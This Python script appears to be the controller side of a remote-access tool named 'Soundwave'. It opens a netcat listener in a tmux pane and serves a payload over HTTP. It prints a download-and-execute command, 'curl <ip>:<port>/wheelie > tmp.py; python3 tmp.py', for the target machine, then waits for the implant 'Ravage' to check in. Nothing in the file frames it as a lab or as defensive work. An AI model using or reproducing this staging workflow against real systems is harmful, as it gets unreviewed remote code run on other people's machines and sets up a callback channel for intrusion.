import web_server
import settings
import libtmux
from time import sleep


def main():
    print('Connecting to tmux session')
    sessions = []
    try:
        sessions = libtmux.Server().list_sessions()
    except:
        print('Tmux session not found, please start tmux first')
        exit(1)
    session = None
    if len(sessions) == 1:
        session = sessions[0]
    else:
        print('More than one session found, please dev this bit')
        raise NotImplementedError()

    session.attached_window.rename_window('Soundwave')

    for window in session.windows:
        if window['window_name'].startswith('SW: '):
            window.kill_window()

    pane_hello = session.new_window(attach=False, window_name='SW: hello').attached_pane
    pane_hello.send_keys('nc -lvp 1338')

    print(f'Starting service on {settings.soundwave_ip} using {settings.ADAPTER}')
    web_server.main()
    print('Web server started... please run below command on client:')
    print(f'curl {settings.soundwave_ip}:{web_server.WEB_SERVER_PORT}/wheelie > tmp.py; python3 tmp.py')

    while 'Hello from Ravage' not in pane_hello.cmd('capture-pan', '-p').stdout:
        pass
    pane_hello.window.kill_window()
    with open('../ravage/hello.txt') as fh:
        print(''.join(fh.readlines()))
    print()


if __name__ == '__main__':
    main()
